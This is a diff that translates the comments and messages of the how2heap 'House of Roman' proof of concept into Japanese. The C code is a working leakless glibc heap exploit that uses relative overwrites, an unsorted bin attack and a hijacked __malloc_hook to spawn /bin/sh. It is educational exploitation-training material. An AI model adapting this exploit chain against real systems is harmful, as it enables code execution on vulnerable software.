@@ -9,14 +9,14 @@
 char* shell = "/bin/sh\x00";
 
 /* 
-Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.
+この手法は、Ubuntu 16.04 上で how2heap 内の glibc_build.sh スクリプトを使って GLibC 2.23、2.24 でテストされています。2.25 は Ubuntu 17.04 でテストされました。
 
-Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman
+コンパイル: gcc -fPIE -pie house_of_roman.c -o house_of_roman
 
 POC written by Maxwell Dulin (Strikeout) 
 */
 
-// Use this in order to turn off printf buffering (messes with heap alignment)
+// printf のバッファリングを無効にするために使います(ヒープのアラインメントを乱すため)
 void* init(){
 	setvbuf(stdout, NULL, _IONBF, 0);
 	setvbuf(stdin, NULL, _IONBF, 0);
@@ -26,370 +26,367 @@ void* init(){
 int main(){
 
 	/* 
-	The main goal of this technique is to create a **leakless** heap 
-	exploitation technique in order to get a shell. This is mainly 
-	done using **relative overwrites** in order to get pointers in 
-	the proper locations without knowing the exact value of the pointer.
+	この手法の主な目的は、シェルを得るための **リークなし(leakless)** の
+	ヒープエクスプロイト手法を作ることです。これは主に、**相対上書き(relative overwrite)** を使って、
+	ポインタの正確な値を知らなくても、ポインタを適切な位置に
+	置くことで実現します。
 
-	The first step is to get a pointer inside of __malloc_hook. This 
-	is done by creating a fastbin bin that looks like the following: 
-	ptr_to_chunk -> ptr_to_libc. Then, we alter the ptr_to_libc
-	 (with a relative overwrite) to point to __malloc_hook. 
+	最初のステップは、__malloc_hook の中を指すポインタを得ることです。
+	これは、次のような fastbin を作ることで行います。
+	ptr_to_chunk -> ptr_to_libc。そして、ptr_to_libc を
+	(相対上書きで)書き換えて __malloc_hook を指すようにします。
 			
-	The next step is to run an unsorted bin attack on the __malloc_hook 
-	(which is now controllable from the previous attack).  Again, we run 
-	the unsorted_bin attack by altering the chunk->bk with a relative overwrite. 
+	次のステップは、__malloc_hook に対して unsorted bin 攻撃を実行することです
+	(__malloc_hook は、前の攻撃によって制御できるようになっています)。ここでも、
+	chunk->bk を相対上書きで書き換えることで unsorted_bin 攻撃を実行します。
 
-	Finally, after launching the unsorted_bin attack to put a libc value 
-	inside of __malloc_hook, we use another relative overwrite on the 
-	value of __malloc_hook to point to a one_gadget, system or some other function.
+	最後に、unsorted_bin 攻撃で libc の値を __malloc_hook の中に
+	入れた後、もう一度 __malloc_hook の値に相対上書きを行い、
+	one_gadget や system などの関数を指すようにします。
 	
-	Now, the next time we run malloc we pop a shell! :) 
-	However, this does come at a cost: 12 bits of randomness must be 
-	brute forced (0.02% chance) of working.
+	これで、次に malloc を実行したときにシェルが起動します! :) 
+	ただし、これには代償があります。12ビットのランダム性を
+	ブルートフォースしなければなりません(成功確率は 0.02%)。
 
-	The original write up for the *House of Roman* can be found at
+	*House of Roman* の元の解説は、次の場所にあります。
 	 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.
 
 
 
 
 
-	This technique requires the ability to edit fastbin and unsorted bin 
-	pointers via UAF or overflow of some kind. Additionally, good control 
-	over the allocations sizes and freeing is required for this technique.
+	この手法では、UAF やなんらかのオーバーフローによって、fastbin と unsorted bin の
+	ポインタを編集できる必要があります。さらに、この手法では、割り当てサイズと
+	解放(free)を十分に制御できることも必要です。
 	*/
 
-	char* introduction = "\nWelcome to the House of Roman\n\n"
-			     "This is a heap exploitation technique that is LEAKLESS.\n"
-			     "There are three stages to the attack: \n\n"
-			     "1. Point a fastbin chunk to __malloc_hook.\n"
-			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
-			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
-			     "All of the stuff mentioned above is done using two main concepts:\n"
-                             "relative overwrites and heap feng shui.\n\n"
-			     "However, this technique comes at a cost:\n"
-                             "12-bits of entropy need to be brute forced.\n"
-			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
-			     "**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
+	char* introduction = "\nHouse of Roman へようこそ\n\n"
+			     "これは、リークなし(LEAKLESS)のヒープエクスプロイト手法です。\n"
+			     "攻撃は3つの段階からなります: \n\n"
+			     "1. fastbin のチャンクを __malloc_hook に向ける。\n"
+			     "2. __malloc_hook に対して unsorted_bin 攻撃を実行する。\n"
+			     "3. __malloc_hook にある main_arena の値を相対上書きする。\n\n"
+			     "上記のことはすべて、2つの主要な概念を使って行われます。\n"
+                             "相対上書きとヒープ風水(heap feng shui)です。\n\n"
+			     "ただし、この手法には代償があります。\n"
+                             "12ビットのエントロピーをブルートフォースする必要があります。\n"
+			     "つまり、この手法は4096回に1回、すなわち 0.02% の確率でしか成功しません。\n"
+			     "**NOTE**: このエクスプロイトでは、結果を一定にするために、ランダムな値を固定しています。\n\n\n";
 	puts(introduction);	
 	init();
 
 
 	/*	
-	Part 1: Fastbin Chunk points to __malloc_hook
+	パート1: fastbin のチャンクが __malloc_hook を指す
 
-	Getting the main_arena in a fastbin chunk ordering is the first step.
-	This requires a ton of heap feng shui in order to line this up properly. 
-	However, at a glance, it looks like the following:
+	最初のステップは、main_arena を fastbin のチャンクの並びの中に入れることです。
+	これを正しく並べるには、大量のヒープ風水が必要です。
+	ただし、ざっと見ると次のようになります。
 
-	First, we need to get a chunk that is in the fastbin with a pointer to
-	a heap chunk in the fd. 
-	Second, we point this chunk to a pointer to LibC (in another heap chunk). 
-	All of the setup below is in order to get the configuration mentioned 
-	above setup to perform the relative overwrites. ";
+	まず、fastbin に入っていて、fd に
+	ヒープチャンクへのポインタを持つチャンクを用意する必要があります。
+	次に、このチャンクが(別のヒープチャンクにある)LibC へのポインタを指すようにします。
+	以下のセットアップはすべて、相対上書きを行うために、上で述べた構成を
+	作るためのものです。 ";
 
 
-	Getting the pointer to libC can be done in two ways: 
-			- A split from a chunk in the small/large/unsorted_bins 
-				gets allocated to a size of 0x70. 
-			- Overwrite the size of a small/large chunk used previously to 0x71.
+	LibC へのポインタを得る方法は2つあります。
+			- small/large/unsorted_bins にあるチャンクを分割して、
+				サイズ 0x70 として割り当てる。
+			- 以前に使った small/large チャンクのサイズを 0x71 に上書きする。
 
-	For the sake of example, this uses the first option because it 
-	requires less vulnerabilities.	
+	例として、必要な脆弱性が少なくて済むので、ここでは最初の方法を使います。	
 	*/
 
-	puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
-	puts("Setting up chunks for relative overwrites with heap feng shui.\n");
+	puts("ステップ1: fastbin のチャンクを __malloc_hook に向ける\n\n");
+	puts("ヒープ風水で、相対上書きのためのチャンクを準備します。\n");
 
-	// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	
+	// 後で UAF のチャンクとして使い、ヒープポインタを書き換えて LibC の値を指すようにします。	
 	uint8_t* fastbin_victim = malloc(0x60); 
 
-	// Allocate this in order to have good alignment for relative 
-	// offsets later (only want to overwrite a single byte to prevent 
-	// 4 bits of brute on the heap).
+	// 後の相対オフセットのために良いアラインメントを得るために、これを割り当てます
+	// (ヒープ上で4ビットのブルートフォースを避けるため、
+	// 1バイトだけを上書きしたいのです)。
 	malloc(0x80);
 
-	// Offset 0x100
+	// オフセット 0x100
 	uint8_t* main_arena_use = malloc(0x80);
 	
-	// Offset 0x190
-	// This ptr will be used for a relative offset on the 'main_arena_use' chunk
+	// オフセット 0x190
+	// このポインタは、'main_arena_use' チャンクに対する相対オフセットに使います
 	uint8_t* relative_offset_heap = malloc(0x60);
 	
-	// Free the chunk to put it into the unsorted_bin. 
-	// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.
+	// このチャンクを free して unsorted_bin に入れます。 
+	// このチャンクは、fd と bk の両方のポインタに main_arena + 0x68 を持ちます。
 	free(main_arena_use);
 	
 
 	/* 
-	Get part of the unsorted_bin chunk (the one that we just freed). 
-	We want this chunk because the fd and bk of this chunk will 
-	contain main_arena ptrs (used for relative overwrite later).
+	unsorted_bin のチャンク(今 free したもの)の一部を取り出します。
+	このチャンクの fd と bk には main_arena のポインタが
+	入っているので、このチャンクが欲しいのです(後の相対上書きに使います)。
 
-	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. 
+	サイズをちょうど 0x60 にしているのは、後でこれを 0x70 の fastbin に入れるためです。 
 
-	This has to be the same size because the __malloc_hook fake 
-	chunk (used later) uses the fastbin size of 0x7f. There is
-	 a security check (within malloc) that the size of the chunk matches the fastbin size.
+	これは同じサイズでなければなりません。後で使う __malloc_hook の偽の
+	チャンクは、fastbin のサイズとして 0x7f を使うからです。
+	(malloc 内には)チャンクのサイズが fastbin のサイズと一致することを確認する
+	セキュリティチェックがあります。
 	*/
 
-	puts("Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n");
+	puts("fd ポインタに LibC の main_arena へのポインタを持つチャンクを割り当てます。\n");
 //Offset 0x100. Has main_arena + 0x68 in fd and bk.
 	uint8_t* fake_libc_chunk = malloc(0x60);
 
 	//// NOTE: This is NOT part of the exploit... \\\
-	// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
+	// __malloc_hook は、このエクスプロイトが複数のバージョンの GLibC で動くよう、オフセットを求めるために計算しています。 
 	long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;
 
 
-	// We need the filler because the overwrite below needs 
-	// to have a ptr in the fd slot in order to work. 
-	//Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. 
+	// このフィラー(filler)が必要なのは、下の上書きが動作するために、
+	// fd スロットにポインタが入っている必要があるからです。 
+	// このチャンクを free すると、後で使うために 'fastbin_victim' の fd スロットにチャンクが入ります。 
 	free(relative_offset_heap);	
 
     	/* 
-    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
-	points to is currently at the offset 0x190 (heap_relative_offset).
+    	このチャンクに UAF を作ります。fastbin_victim が指しているチャンクは、
+	現在オフセット 0x190(heap_relative_offset)にあることを思い出してください。
      	*/
 	free(fastbin_victim);
 
 	/*
 
-	Now, we start doing the relative overwrites, since that we have 
-	the pointers in their proper locations. The layout is very important to 
-	understand for this.
+	これで、ポインタが適切な位置に入ったので、相対上書きを始めます。
+	この部分では、レイアウトを理解することがとても重要です。
 
-	Current heap layout: 
+	現在のヒープのレイアウト: 
 	0x0:   fastbin_victim       - size 0x70 
 	0x70:  alignment_filler     - size 0x90
 	0x100: fake_libc_chunk      - size 0x70
 	0x170: leftover_main        - size 0x20
 	0x190: relative_offset_heap - size 0x70 
 
-	bin layout: 
+	bin のレイアウト: 
 			fastbin:  fastbin_victim -> relative_offset_heap
 			unsorted: leftover_main
 	
-	Now, the relative overwriting begins:
-	Recall that fastbin_victim points to relative_offset_heap 
-	(which is in the 0x100-0x200 offset range). The fastbin uses a singly 
-	linked list, with the next chunk in the 'fd' slot.
+	では、相対上書きを始めます。
+	fastbin_victim は relative_offset_heap(オフセット 0x100〜0x200 の範囲にあります)を
+	指していることを思い出してください。fastbin は単方向連結リストを使っており、
+	次のチャンクは 'fd' スロットに入ります。
 
-	By *partially* editing the fastbin_victim's last byte (from 0x90 
-	to 0x00) we have moved the fd pointer of fastbin_victim to 
-	fake_libc_chunk (at offset 0x100).
+	fastbin_victim の最後のバイトを(0x90 から 0x00 に)*部分的に*書き換えることで、
+	fastbin_victim の fd ポインタを fake_libc_chunk(オフセット 0x100)に
+	移動させました。
 
-	Also, recall that fake_libc_chunk had previously been in the unsorted_bin. 
-	Because of this, it has a fd pointer that points to main_arena + 0x68. 
+	また、fake_libc_chunk は以前 unsorted_bin に入っていたことを思い出してください。 
+	そのため、main_arena + 0x68 を指す fd ポインタを持っています。 
 
-	Now, the fastbin looks like the following: 
+	これで、fastbin は次のようになります。 
 	fastbin_victim -> fake_libc_chunk ->(main_arena + 0x68).
 
 
-	The relative overwrites (mentioned above) will be demonstrates step by step below.
+	(上で述べた)相対上書きは、以下で順を追って説明します。
 	
 	*/
 
 
 	puts("\
-Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
-to the chunk with the LibC address\n");
+ヒープチャンクの最初のバイトを上書きして、fastbin のチャンクを\n\
+LibC のアドレスを持つチャンクに向けます\n");
 	puts("\
-Fastbin 0x70 now looks like this:\n\
+Fastbin 0x70 は現在、次のようになっています:\n\
 heap_addr -> heap_addr2 -> LibC_main_arena\n");
-	fastbin_victim[0] = 0x00; // The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.
+	fastbin_victim[0] = 0x00; // この位置は 0x100 です。ただし、書き換えたいのは最初のバイトだけです。そのため、ここに 0x0 を入れます。
 	
 
 	/*
-	Now, we have a fastbin that looks like the following: 
+	これで、fastbin は次のようになりました。 
 			0x70: fastbin_victim -> fake_libc_chunk -> (main_arena + 0x68)
 	
-	We want the fd ptr in fake_libc_chunk to point to something useful. 
-	So, let's edit this to point to the location of the __malloc_hook. 
-	This way, we can get control of a function ptr.
+	fake_libc_chunk の fd ポインタが、何か有用なものを指すようにしたいところです。 
+	そこで、__malloc_hook の位置を指すように書き換えましょう。 
+	こうすれば、関数ポインタを制御できます。
 
-	To do this, we need a valid malloc size. Within the __memalign_hook 
-	is usually an address that usually starts with 0x7f. 
-	Because __memalign_hook value is right before this are all 0s, 
-	we could use a misaligned chunk to get this to work as a valid size in 
-	the 0x70 fastbin.
+	そのためには、有効な malloc サイズが必要です。__memalign_hook の中には、
+	通常 0x7f で始まるアドレスがあります。 
+	__memalign_hook の値のすぐ前はすべて 0 なので、
+	アラインされていないチャンクを使えば、0x70 の fastbin で有効なサイズとして
+	これを機能させられます。
 
-	This is where the first 4 bits of randomness come into play. 
-	The first 12 bits of the LibC address are deterministic for the address. 
-	However, the next 4 (for a total of 2 bytes) are not. 
+	ここで、最初の4ビットのランダム性が関わってきます。 
+	LibC アドレスの最初の12ビットは、アドレスに対して決定的です。 
+	しかし、次の4ビット(合計で2バイト)はそうではありません。 
 	
-	So, we have to brute force 2^4 different possibilities (16) 
-	in order to get this in the correct location. This 'location' 
-	is different for each version of GLibC (should be noted).
+	そのため、2^4 通り(16通り)の可能性をブルートフォースして、
+	正しい位置に合わせる必要があります。この「位置」は、
+	GLibC のバージョンごとに異なります(注意してください)。
 
-	After doing this relative overwrite, the fastbin looks like the following:
+	この相対上書きの後、fastbin は次のようになります。
 			0x70: fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23).
 
 	*/
 	
 	/* 
-	Relatively overwrite the main_arena pointer to point to a valid 
-	chunk close to __malloc_hook.
+	main_arena のポインタを相対上書きして、__malloc_hook の近くにある
+	有効なチャンクを指すようにします。
 
-	///// NOTE: In order to make this exploit consistent 
-	(not brute forcing with hardcoded offsets), we MANUALLY set the values. \\\
+	///// NOTE: このエクスプロイトを(ハードコードしたオフセットでの
+	ブルートフォースをせずに)一貫して動かすために、値を手動で設定します。 \\\
 
-	In the actual attack, this values would need to be specific 
-	to a version and some of the bits would have to be brute forced 
-	(depending on the bits).
+	実際の攻撃では、この値はバージョンごとに固有であり、
+	(ビットによっては)一部のビットをブルートフォースしなければなりません。
 	*/ 
 
 puts("\
-Use a relative overwrite on the main_arena pointer in the fastbin.\n\
-Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
-	long long __malloc_hook_adjust = __malloc_hook - 0x23; // We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.
+fastbin 内の main_arena ポインタに相対上書きを行います。\n\
+偽の fastbin チャンクを作るために、これを __malloc_hook の近くに向けます\n");
+	long long __malloc_hook_adjust = __malloc_hook - 0x23; // malloc から 0x23 を引くのは、0x7f を有効な fastbin チャンクのサイズとして使いたいからです。
 
-	// The relative overwrite
+	// 相対上書き
 	int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
 	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
-	fake_libc_chunk[0] = byte1; // Least significant bytes of the address.
-	fake_libc_chunk[1] = byte2; // The upper most 4 bits of this must be brute forced in a real attack.
+	fake_libc_chunk[0] = byte1; // アドレスの最下位バイト。
+	fake_libc_chunk[1] = byte2; // 実際の攻撃では、この上位4ビットをブルートフォースしなければなりません。
 
-	// Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
-	// These are fastbin_victim and fake_libc_chunk.
-	puts("Get the fake chunk pointing close to __malloc_hook\n");
+	// fastbin 内の __malloc_hook チャンクの前に、フィラーのチャンクが2つあります。 
+	// fastbin_victim と fake_libc_chunk です。
+	puts("偽のチャンクを __malloc_hook の近くに向けます\n");
 	puts("\
-In a real exploit, this would fail 15/16 times\n\
-because of the final half byet of the malloc_hook being random\n");	
+実際のエクスプロイトでは、malloc_hook の最後の半バイトがランダムなため、\n\
+これは 15/16 の確率で失敗します\n");	
 	malloc(0x60);
 	malloc(0x60);
 
-	// If the 4 bit brute force did not work, this will crash because 
-	// of the chunk size not matching the bin for the chunk. 
-	// Otherwise, the next step of the attack can begin.
+	// 4ビットのブルートフォースが成功しなかった場合、チャンクのサイズが 
+	// そのチャンクの bin と一致しないため、ここでクラッシュします。 
+	// 成功した場合は、攻撃の次のステップに進めます。
 	uint8_t* malloc_hook_chunk = malloc(0x60);	
 
-	puts("Passed step 1 =)\n\n\n");
+	puts("ステップ1 通過 =)\n\n\n");
 
 	/*
-	Part 2: Unsorted_bin attack 
+	パート2: Unsorted_bin 攻撃 
 
-	Now, we have control over the location of the __malloc_hook. 
-	However, we do not know the address of LibC still. So, we cannot 
-	do much with this attack. In order to pop a shell, we need 
-	to get an address at the location of the __malloc_hook.
+	これで、__malloc_hook の位置を制御できるようになりました。 
+	しかし、LibC のアドレスはまだ分かりません。そのため、この攻撃でできることは
+	多くありません。シェルを起動するには、__malloc_hook の位置に
+	アドレスを入れる必要があります。
 
-	We will use the unsorted_bin attack in order to change the value 
-	of the __malloc_hook with the address of main_arena + 0x68. 
-	For more information on the unsorted_bin attack, review 
-	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c.
+	unsorted_bin 攻撃を使って、__malloc_hook の値を
+	main_arena + 0x68 のアドレスに書き換えます。 
+	unsorted_bin 攻撃の詳細は、
+	https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c を参照してください。
 
-	For a brief overview, the unsorted_bin attack allows us to write
-	main_arena + 0x68 to any location by altering the chunk->bk of
-	an unsorted_bin chunk. We will choose to write this to the 
-	location of __malloc_hook.
+	簡単に概要を述べると、unsorted_bin 攻撃では、unsorted_bin のチャンクの
+	chunk->bk を書き換えることで、任意の場所に
+	main_arena + 0x68 を書き込めます。この書き込み先として、
+	__malloc_hook の位置を選びます。
 
-	After we overwrite __malloc_hook with the main_arena, we will 
-	edit the pointer (with a relative overwrite) to point to a 
-	one_gadget for immediate code execution.
+	__malloc_hook を main_arena で上書きした後、そのポインタを
+	(相対上書きで)書き換えて、すぐにコードを実行できる
+	one_gadget を指すようにします。
 			
-	Again, this relative overwrite works well but requires an additional 
-	1 byte (8 bits) of brute force.
-	This brings the chances of a successful attempt up to 12 bits of 
-	randomness. This has about a 1/4096 or a 0.0244% chance of working.
+	この相対上書きもうまく機能しますが、追加で
+	1バイト(8ビット)のブルートフォースが必要です。
+	これにより、成功させるために必要なランダム性は合計12ビットになります。
+	成功確率はおよそ 1/4096、つまり 0.0244% です。
 
 	
-	The steps for phase two of the attack are explained as we go below.
+	攻撃のフェーズ2の手順は、以下で進めながら説明します。
 	*/
 
 	puts("\
-Start Step 2: Unsorted_bin attack\n\n\
-The unsorted bin attack gives us the ability to write a\n\
-large value to ANY location. But, we do not control the value\n\
-This value is always main_arena + 0x68. \n\
-We point the unsorted_bin attack to __malloc_hook for a \n\
-relative overwrite later.\n");
+ステップ2 開始: Unsorted_bin 攻撃\n\n\
+unsorted bin 攻撃を使うと、任意の場所に大きな値を\n\
+書き込めます。ただし、その値は制御できません。\n\
+この値は常に main_arena + 0x68 です。 \n\
+後で相対上書きを行うために、unsorted_bin 攻撃を \n\
+__malloc_hook に向けます。\n");
 
 
-	// Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.
+	// 破壊するチャンクを用意します。free したときに統合(consolidation)されるのを防ぐために、別のポインタも追加します。
 	
 	uint8_t* unsorted_bin_ptr = malloc(0x80);	
-	malloc(0x30); // Don't want to consolidate
+	malloc(0x30); // 統合されたくありません
 
-	puts("Put chunk into unsorted_bin\n");
-	// Free the chunk to create the UAF
+	puts("チャンクを unsorted_bin に入れます\n");
+	// チャンクを free して UAF を作ります
 	free(unsorted_bin_ptr);
 
-	/* /// NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
-	 However, for the sake of example, this has been calculated dynamically. 
+	/* /// NOTE: byte2 の下位4ビットは、本来は前の段階でブルートフォースされているはずです。 \\\ 
+	 ただし、例示のために、ここでは動的に計算しています。 
 	*/
-	__malloc_hook_adjust = __malloc_hook - 0x10; // This subtract 0x10 is needed because of the chunk->fd doing the actual overwrite on the unsorted_bin attack.
+	__malloc_hook_adjust = __malloc_hook - 0x10; // ここで 0x10 を引くのは、unsorted_bin 攻撃で実際の上書きを行うのが chunk->fd だからです。
 	byte1 = (__malloc_hook_adjust) & 0xff; 	
 	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
 
 
-	// Use another relative offset to overwrite the ptr of the chunk->bk pointer.
-	// From the previous brute force (4 bits from before) we 
-	// know where the location of this is at. It is 5 bytes away from __malloc_hook.
-	puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
-	unsorted_bin_ptr[8] = byte1; // Byte 0 of bk. 	
+	// 別の相対オフセットを使って、chunk->bk ポインタを上書きします。
+	// 前のブルートフォース(前の4ビット)から、
+	// この位置が分かっています。__malloc_hook から5バイト離れています。
+	puts("チャンクの最後の2バイトを上書きして、__malloc_hook を指すようにします\n");
+	unsorted_bin_ptr[8] = byte1; // bk のバイト 0。 	
 
-	// //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///
-	unsorted_bin_ptr[9] = byte2; // Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.
+	// //// NOTE: 通常は、バイトの後半部分もブルートフォースしなければなりません。ただし、例示のために、エクスプロイトを一貫して動かすよう、ここで設定しています。 ///
+	unsorted_bin_ptr[9] = byte2; // bk のバイト 1。この後半の4ビットは前にブルートフォースされており、前半の4ビットは固定です。
 	
 	/* 
-	Trigger the unsorted bin attack.
-	This will write the value of (main_arena + 0x68) to whatever is in the bk ptr + 0x10.
+	unsorted bin 攻撃を発動します。
+	これにより、bk ポインタ + 0x10 にあるアドレスに、(main_arena + 0x68)の値が書き込まれます。
 
-	A few things do happen though: 
-		- This makes the unsorted bin (hence, small and large too) 
-		   unusable. So, only allocations previously in the fastbin can only be used now.
-		- If the same size chunk (the unsorted_bin attack chunk) 
-		   is NOT malloc'ed, the program will crash immediately afterwards. 
-		   So, the allocation request must be the same as the unsorted_bin chunk.
+	ただし、いくつか起こることがあります。 
+		- unsorted bin(したがって small や large も)が
+		   使えなくなります。そのため、以降は以前に fastbin にあった割り当てしか使えません。
+		- 同じサイズのチャンク(unsorted_bin 攻撃のチャンク)を 
+		   malloc *しない*と、直後にプログラムがクラッシュします。 
+		   そのため、割り当て要求は unsorted_bin のチャンクと同じサイズでなければなりません。
 
 
-	The first point is totally fine (in this attack). But, in more complicated 
-	programming, this can be an issue.
-	The second just requires us to do the same size allocaton as the current chunk.
+	最初の点は(この攻撃では)まったく問題ありません。しかし、より複雑な
+	プログラムでは、問題になることがあります。
+	2つ目の点は、現在のチャンクと同じサイズで割り当てるだけで済みます。
 
 	*/
 
-	puts("Trigger the unsorted_bin attack\n");
-	malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68
+	puts("unsorted_bin 攻撃を発動します\n");
+	malloc(0x80); // unsorted_bin 攻撃を発動して、__malloc_hook を main_arena + 0x68 で上書きします
 
 	long long system_addr = (long long)dlsym(RTLD_NEXT, "system");
 
-	puts("Passed step 2 =)\n\n\n");
+	puts("ステップ2 通過 =)\n\n\n");
 	/* 
-	Step 3: Set __malloc_hook to system
+	ステップ3: __malloc_hook を system に設定する
 	
-	The chunk itself is allocated 19 bytes away from __malloc_hook. 
-	So, we use a realtive overwrite (again) in order to partially overwrite 
-	the main_arena pointer (from unsorted_bin attack) to point to system.
+	チャンク自体は、__malloc_hook から 19 バイト離れた位置に割り当てられています。 
+	そのため、(もう一度)相対上書きを使って、(unsorted_bin 攻撃で入れた)
+	main_arena のポインタを部分的に上書きし、system を指すようにします。
 
-	In a real attack, the first 12 bits are static (per version). 
-	But, after that, the next 12 bits must be brute forced. 
+	実際の攻撃では、最初の12ビットは(バージョンごとに)固定です。 
+	しかし、その後の12ビットはブルートフォースしなければなりません。 
 
-	/// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
+	/// NOTE: 例示のために、これらの値はブルートフォースせずに設定します。 \\\
 	*/ 
 
-	puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
+	puts("ステップ3: __malloc_hook を system/one_gadget に設定する\n\n");
 	puts("\
-Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
-we can use a relative overwrite to point this to system or a one_gadget.\n\
-Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
-comes from.\n");
-	malloc_hook_chunk[19] = system_addr & 0xff; // The first 12 bits are static (per version).
+これで __malloc_hook の中に LibC へのポインタが入りました(ステップ2より)。 \n\
+相対上書きを使って、これを system や one_gadget に向けられます。\n\
+注: 実際の攻撃では、ここが最後の8ビットのブルートフォースが\n\
+必要になる箇所です。\n");
+	malloc_hook_chunk[19] = system_addr & 0xff; // 最初の12ビットは(バージョンごとに)固定です。
 
-	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
-	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
-	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.
+	malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // これの下位4ビット(最後の4ビット)はブルートフォースしなければなりません(すでに実施済み)。
+	malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // 最後のバイトは、ブルートフォースしなければならない残りの8ビットです。
+	malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // データセクションとテキストセクションの間の隙間が非常に広い場合は、これも必要です。念のために入れています。
 
 
-	// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.
-	// In a real example, you would probably want to use a one_gadget. 
-	// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter
-	// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. 
-	// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.
-	puts("Pop Shell!");
+	// system 呼び出しが __malloc_hook から実行されることで、malloc の呼び出しによるコード実行を発動します。
+	// 実際のエクスプロイトでは、おそらく one_gadget を使いたいところです。 
+	// しかし、移植性を保つために、ここでは system を使い、引数として /bin/sh へのポインタを追加します。
+	// これはやや不正ですが(バイナリは PIE です)、バイナリが PIE でなければ、.bss セクション内のポインタを使えば、リークなしで動作します。 
+	// (一貫性のために)先に system のアドレスを取得するには、バイナリは PIE である必要があります。そのため、アドレスをここに入れています。
+	puts("シェルを起動します!");
 	malloc((long long)shell);
 		
 }
-
